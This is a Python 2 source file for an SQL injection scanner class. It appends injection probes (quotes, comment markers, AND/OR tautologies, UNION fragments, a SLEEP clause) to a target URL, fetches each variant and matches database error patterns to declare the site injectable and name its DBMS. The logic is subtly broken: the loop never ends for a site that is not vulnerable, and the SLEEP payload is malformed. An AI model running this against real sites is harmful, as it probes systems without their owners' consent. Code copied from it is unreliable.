import urllib2
import random
from urlparse import urlparse
from bs4 import BeautifulSoup
from lib.core.settings import RANDOM_COMMON_COLUMN
from lib.core.settings import SQLI_ERROR_REGEX


class SQLiScanner(object):

    """ Scan a URL for SQL injection possibilities. """

    vulnerable = False

    def __init__(self, url, proxy=None, agent=None, tamper=None):
        self.url = url
        self.proxy = proxy  # Only HTTP proxy for now
        self.agent = agent
        self.tamper = tamper
        self.int = random.randint(1, 13)
        self.error_syntax = ["'", "--", ';', '"', "/*", "'/*", "'--", '"--', "';", '";', '`',
                             " AND {int}={int}".format(int=self.int),
                             " OR {int}={int}".format(int=self.int),
                             " OR NOT {int}={int}".format(int=self.int),
                             " UNION FALSE {}".format(RANDOM_COMMON_COLUMN.strip()),
                             " UNION {}".format(RANDOM_COMMON_COLUMN.strip()),
                             " AND {int}=IF(({int})),SLEEP({int}),{int}".format(int=self.int)]

    @staticmethod
    def obtain_inject_query(url):
        """ Obtain the injection query of the URL """
        return urlparse(url).query

    def add_injection_syntax_to_url(self):
        """ Add injection syntax to the URL
        >>> SQLiScanner("http://google.com/#?id=2").add_injection_syntax_to_url()
        http://google.com/#?id=2'
        ...
        http://google.com/#?id=2 AND 1=1
        ...
        http://google.com/#?id=2 UNION FALSE table
        """
        results = set()
        for syntax in self.error_syntax:
            results.add(self.url + syntax)

        return results

    def sqli_search(self):
        """ Search for SQL injection in the provided URL[error based injection] """
        while self.vulnerable is not True:
            for url in self.add_injection_syntax_to_url():
                query = self.obtain_inject_query(url)
                data = urllib2.urlopen(url, timeout=5).read()
                soup = [BeautifulSoup(data, 'html.parser')]
                for html in soup:
                    for regex in SQLI_ERROR_REGEX.keys():
                        if regex.findall(str(html)):
                            self.vulnerable = True
                            sqli_info = "'{}' appears to be vulnerable to SQL injection ".format(self.url)
                            sqli_info += "at ({}). The backend DBMS appears to be: {}.".format(query, SQLI_ERROR_REGEX[regex])
                            return sqli_info
        if self.vulnerable is False:
            return "%s is not vulnerable to SQL injection." % self.url
